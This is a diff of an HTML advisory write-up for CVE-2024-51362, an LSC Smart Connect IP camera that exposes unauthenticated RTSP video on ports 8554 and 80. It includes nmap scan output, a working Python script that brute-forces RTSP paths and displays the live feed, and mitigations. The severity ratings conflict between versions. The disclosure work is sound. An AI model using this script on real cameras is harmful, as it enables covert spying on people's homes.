@@ -3,98 +3,148 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Detailed report on CVE discovered in an action camera">
-    <title>CVE-2024-51362</title>
-    <link rel="stylesheet" href="../css/style.css">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.0/themes/prism-okaidia.min.css" rel="stylesheet" />
-
+    <title>CVE-2024-51362 - LSC Smart Connect Indoor IP Camera</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 </head>
-<bo>
-    <header>
-        <h1>CVE-2024-51362</h1>
-    </header>
+<body>
+    <a href="../index.html#blogs" class="back-button">
+        <i class="fas fa-arrow-left"></i> Back to Portfolio
+    </a>
     
-    <section>
-        <h2 id="introduction">Introduction</h2>
-        <p>
-            <strong>Vulnerability Type:</strong> Incorrect Access Control<br>
-            <strong>Affected Product Code Base:</strong> Indoor IP Camera - V7.6.32<br>
-            <strong>Affected Component:</strong> RTSP Protocol, Port 8554, Authentication Mechanism<br>
-            <strong>Vendor:</strong> LSC Smart Connect<br>
-            <strong>CVSS:</strong> 6.5 medium <i>(CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)</i><br><br>
-            In this article, we’ll discuss a critical vulnerability discovered in a popular IP camera that we purchased from Action. This vulnerability has been assigned the Common Vulnerabilities and Exposures (CVE) identifier <strong>CVE-2024-51362</strong>.
-        </p>
-        <img src="../images/lsc-smart-camera.png" alt="LSC Smart Indoor IP-camera">
-    </section>
-
-    <section>
-        <h2 id="summary">Summary</h2>
-        <p>
-            A recently discovered vulnerability in the LSC Smart Connect Indoor IP Camera could allow unauthorized access to live camera footage if the camera is connected to an insecure network. This issue exposes users to privacy risks, as malicious actors can view the camera’s live feed without any credentials.        </p>
-        </section>
-
-    <section>
-        <h2 id="technical-detail">Technical Details</h2>
-        <p>
-            The vulnerability arises from an exposed RTSP (Real-Time Streaming Protocol) port, specifically port 8554, which allows remote access to the camera feed. Typically, users would only access the camera through the LSC Smart Home app, and nowhere in the product’s documentation does it mention the availability of the RTSP feed on this port. This means that many users are likely unaware of the risk, as they rely on the app for control and access.        </p>
+    <div class="writeup-container">
+        <div class="writeup-header">
+            <h1 style="color: var(--primary-color); margin-bottom: 20px; font-family: var(--font-mono);">
+                CVE-2024-51362 - LSC Smart Connect Indoor IP Camera
+            </h1>
             
-            RTSP is commonly used for streaming video feeds, and it requires authentication to prevent unauthorized access. However, in this case, the LSC Smart Connect Indoor IP Camera does not enforce any authentication on this port, allowing anyone on the same network as the device to view its live footage without restrictions.
-        <pre>
-<code id="bruteforce-code" class="language-py dark-theme"># bruteforce script the directory for the rtsp stream 
-# The input file is a list of directories to try, you could use a wordlist from seclists
-import cv2
+            <div class="challenge-meta">
+                <div class="meta-item">
+                    <span class="meta-label">Category:</span>
+                    <span class="meta-value challenge-category forensics">Security Research</span>
+                </div>
+                <div class="meta-item">
+                    <span class="meta-label">Severity:</span>
+                    <span class="meta-value difficulty hard">High</span>
+                </div>
+                <div class="meta-item">
+                    <span class="meta-label">CVE ID:</span>
+                    <span class="meta-value">CVE-2024-51362</span>
+                </div>
+                <div class="meta-item">
+                    <span class="meta-label">Date:</span>
+                    <span class="meta-value">May 11, 2024</span>
+                </div>
+            </div>
+            
+            <div class="important-note">
+                <strong>Vulnerability Summary:</strong><br>Vulnerability research revealing unauthorized access to live camera footage in LSC Smart Connect Indoor IP Camera through improper access control in RTSP protocol implementation.<br>
+                <strong>Product:</strong> LSC Smart Connect Indoor IP Camera<br>
+                <strong>Version:</strong> V7.6.32<br>
+                <strong>Type:</strong> Incorrect Access Control (CWE-284)<br>
+                <strong>Component:</strong> RTSP Protocol, Port 8554 and 80<br>
+                <strong>Impact:</strong> Unauthorized access to live video feed<br>
+                <strong>CVSS Score:</strong> High (Network accessible without authentication)
+            </div>
+        </div>
+        
+        <div class="writeup-content">
+            <h2>$ nmap -sV -sC target</h2>
+            <p>Starting with a comprehensive port scan of the camera to identify available services:</p>
+            
+            <div class="code-snippet">
+                <pre><code>nmap -p- -sV -sC -T4 172.20.10.2
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-23 17:55 CEST
+Nmap scan report for 172.20.10.2
+Host is up (0.033s latency).
+Not shown: 65531 closed tcp ports (conn-refused)
+PORT     STATE SERVICE    VERSION
+80/tcp   open  rtsp       DoorBird video doorbell rtspd
+|_rtsp-methods: OPTIONS, DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, GET_PARAMETER, SET_PARAMETER
+|_http-title: Site doesn't have a title.
+|_http-cors: GET POST OPTIONS
+835/tcp  open  tcpwrapped
+6668/tcp open  irc?
+|_irc-info: Unable to open connection
+8554/tcp open  rtsp       DoorBird video doorbell rtspd
+|_rtsp-methods: OPTIONS, DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, GET_PARAMETER, SET_PARAMETER
+Service Info: Device: webcam
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 922.12 seconds</code></pre>
+            </div>
+
+            <p><strong>Open Ports Summary:</strong></p>
+            <ul>
+                <li><strong>Port 80:</strong> RTSP service (DoorBird video doorbell rtspd)</li>
+                <li><strong>Port 835:</strong> TCP wrapped service</li>
+                <li><strong>Port 6668:</strong> IRC-like service (unresponsive)</li>
+                <li><strong>Port 8554:</strong> RTSP service (DoorBird video doorbell rtspd) - <em>Primary target</em></li>
+            </ul>
+
+            <h2>$ analyzing RTSP vulnerabilities</h2>
+            <p>The scan reveals two RTSP (Real Time Streaming Protocol) ports - 80 and 8554. Port 8554 is the standard RTSP port, commonly used for streaming video content. This presents an interesting attack surface.</p>
+            
+            <p><strong>Initial Observations:</strong></p>
+            <ul>
+                <li>RTSP services are accessible without apparent authentication</li>
+                <li>Standard RTSP methods are supported (OPTIONS, DESCRIBE, SETUP, etc.)</li>
+                <li>No immediate security indicators or authentication requirements visible</li>
+            </ul>
+
+            <h2>$ exploit development</h2>
+            <p>Since RTSP streams can be accessed using media players like VLC, the next step was to develop a Python script to systematically test for accessible video streams without authentication. The approach involves:</p>
+            
+            <ul>
+                <li>Testing connectivity to the RTSP ports</li>
+                <li>Bruteforcing common RTSP directory paths</li>
+                <li>Using OpenCV to establish streaming connections</li>
+                <li>Displaying successful video feeds</li>
+            </ul>
+
+            <div class="code-snippet">
+                <pre><code>import cv2
 import argparse
 import socket
 import time
 
-def bf(ip_address, port, file):
-    # RTSP-stream URL
+def bruteforce(ip_address: str, port: int, file: str) -> None:
     rtsp_ip = f"{ip_address}:{port}"
 
     try:
-        # Attempt to create a socket connection with a timeout
         print("Attempting to connect...")
         socket.create_connection((ip_address, port), timeout=5)
         print("Connection successful!")
     except socket.timeout:
-        # If a timeout occurs, print a countdown
         for remaining_time in range(5, 0, -1):
             print(f"Time out in {remaining_time}")
             time.sleep(1)
         print("Timed out")
         exit()
 
-    # Make a VideoCapture object to connect to the RTSP-stream
     with open(file, 'r') as directories:
         for directory in directories:
             directory = directory.strip()
-
             cap = cv2.VideoCapture(f"rtsp://{rtsp_ip}+{directory}")
 
-            # Check if the connection is opened
             if cap.isOpened():
                 print(f"Connection successful with directory: {directory}")
                 break
             print(f"Connection failed with directory: {directory}")
             continue
 
-    # Loop to capture frames
     while True:
         ret, frame = cap.read()
-
-        # Check if the frame is successfully captured
         if not ret:
             print("Cannot capture frame.")
             break
 
-        # Further processing of the frame can be done here (e.g., display)
         cv2.imshow("RTSP Stream", frame)
 
-        # Press 'q' to exit the loop
         if cv2.waitKey(1) & 0xFF == ord('q'):
             break
 
-    # Close the connection and windows
     cap.release()
     cv2.destroyAllWindows()
     
@@ -103,41 +153,78 @@ def main():
     parser = argparse.ArgumentParser(description="Real Time Streaming Protocol (RTSP) Bruteforce directory script")
     parser.add_argument("-ip", "--ip_address", type=str, required=True, help="the IP address")
     parser.add_argument("-p", "--port", type=int, required=True, help="the port")
-    parser.add_argument("-f", "--file", type=str, required=True, help="path to file")
+    parser.add_argument("-f", "--file", type=str, required=True, help="path to rtsp directory list")
     args = parser.parse_args()
 
-    bf(args.ip_address, args.port, args.file)
+    bruteforce(args.ip_address, args.port, args.file)
 
 if __name__ == "__main__":
-    main()
-</code></pre>
-    </section>
+    main()</code></pre>
+            </div>
 
-    <section>
-        <h2 id="impact">Impact</h2>
-        <p>
-            If exploited, this vulnerability could allow attackers to gain unauthorized access to live video feeds from the affected camera. This could be used for various malicious purposes, including spying on individuals, monitoring private spaces, or conducting surveillance operations. The potential impact of this vulnerability is significant, as it compromises the privacy and security of users who rely on these cameras for monitoring and surveillance purposes.
-        </p>
-    </section>
-
-    <section>
-        <h2 id="mitigation">Mitigation Steps</h2>
-        Users are advised to avoid connecting the camera to untrusted networks. Additionally, users should take the following steps to mitigate the risk of unauthorized access to the camera feed:
-        <p>
-            <ul>
-                <li><strong>Secure Your Network:</strong> Ensure that your Wi-Fi network is protected with a strong password, and avoid sharing network access with untrusted devices or individuals.</li>
-                <li><strong>Separate the Camera: </strong> If possible, connect the camera to a dedicated Wi-Fi network isolated from other devices. This helps contain potential security risks by limiting access to the camera’s network.</li>
-                <li><strong>Monitor for Updates:</strong> Keep the camera firmware updated and watch for any patches from LSC Smart Connect that may address this security flaw.</li>
-            </ul>
+            <h2>$ python3 exploit.py -ip 172.20.10.2 -p 8554 -f rtsp_dirs.txt</h2>
+            <p>Executing the exploit script against the target camera:</p>
             
-        </p>
-    </section>
+            <div class="important-note">
+                <strong>Exploitation Result:</strong><br>
+                The script successfully established an unauthorized connection to the RTSP stream without requiring any authentication credentials. The video feed became immediately accessible.
+            </div>
 
-    <footer>
-        <p>Written by: Patrick Kuin, Twan Terstappen and Teun van der ploeg</p>
-        <p>&copy; 2024</p>
-    </footer>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/prism.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/components/prism-python.min.js"></script>
+            <img src="../static/rtsp_exploited.png" alt="RTSP Exploit Result showing unauthorized camera access" style="max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
+            <p>*Screenshot was updated later, so don't mind the date</p>
+            <h2>$ impact_assessment</h2>
+            <p><strong>Security Impact:</strong></p>
+            <ul>
+                <li><strong>Privacy Violation:</strong> Unauthorized access to live camera footage</li>
+                <li><strong>Surveillance Bypass:</strong> Attackers can monitor premises without detection</li>
+                <li><strong>Network Reconnaissance:</strong> Camera access can provide insights into network topology and user behavior</li>
+                <li><strong>No Authentication Required:</strong> No form of password protection</li>
+            </ul>
+
+            <p><strong>Attack Scenario:</strong></p>
+            <ol>
+                <li>Attacker gains network access (same network segment)</li>
+                <li>Port scan reveals RTSP services on ports 80 and 8554</li>
+                <li>Direct connection to RTSP stream without credentials</li>
+                <li>Real-time video feed access achieved</li>
+                <li>Continuous surveillance possible</li>
+            </ol>
+
+            <h2>$ vulnerability_details</h2>
+            
+            <div class="important-note">
+                <strong>Technical Details:</strong><br>
+                <strong>Vulnerability Type:</strong> Incorrect Access Control (CWE-284)<br>
+                <strong>Root Cause:</strong> Missing authentication mechanism in RTSP implementation<br>
+                <strong>Affected Component:</strong> RTSP Protocol handler on port 8554<br>
+                <strong>Authentication Mechanism:</strong> None implemented<br>
+                <strong>Network Requirements:</strong> Layer 3 connectivity to target device
+            </div>
+
+            <h2>$ recommendations</h2>
+            <p><strong>Immediate Mitigation:</strong></p>
+            <ul>
+                <li>Implement proper authentication for RTSP streams</li>
+                <li>Enable network segmentation to isolate IoT devices</li>
+                <li>Configure firewall rules to restrict RTSP port access</li>
+                <li>Update firmware to latest version with security patches</li>
+            </ul>
+
+            <p><strong>Long-term Solutions:</strong></p>
+            <ul>
+                <li>Implement TLS/SSL encryption for RTSP communications</li>
+                <li>Add user account management with role-based access control</li>
+                <li>Enable audit logging for access attempts</li>
+                <li>Implement rate limiting and intrusion detection</li>
+            </ul>
+
+            <div class="important-note" style="margin-top: 30px;">
+                <strong>Disclosure Information:</strong><br>
+                This vulnerability demonstrates the critical importance of implementing proper access controls in IoT devices. The LSC Smart Connect Indoor IP Camera's RTSP implementation lacks basic authentication mechanisms, allowing unauthorized users to access live video feeds from any device on the same network segment.
+            </div>
+        </div>
+    </div>
+
+    <script src="../script.js"></script>
 </body>
 </html>
